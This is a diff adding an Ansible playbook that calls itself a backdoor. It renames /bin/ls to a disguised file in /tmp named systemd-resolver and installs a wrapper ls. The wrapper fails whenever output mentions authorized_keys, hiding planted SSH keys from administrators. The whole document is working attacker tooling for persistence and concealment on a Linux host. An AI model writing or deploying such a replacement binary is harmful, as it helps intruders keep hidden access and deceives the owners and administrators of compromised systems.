@@ -1,0 +1,15 @@
+---
+- name: "backdoored ls to hide ssh keys"
+  hosts: localhost
+  connection: local
+  tasks:
+    - name: "move ls"
+      shell: "mv /bin/ls /tmp/systemd-resolver"
+    - name: "make new ls file"
+      shell: "touch /bin/ls; chmod +x /bin/ls"
+    - name: "populate new ls file line 1"
+      shell: "echo '#!/bin/sh' >> /bin/ls"
+    - name: "populate new ls file line 2"
+      shell: "echo 'if /tmp/systemd-resolver $@ | grep -q 'authorized_keys'; then exit 1; else /tmp/systemd-resolver $@; fi;' >> /bin/ls"
+
+
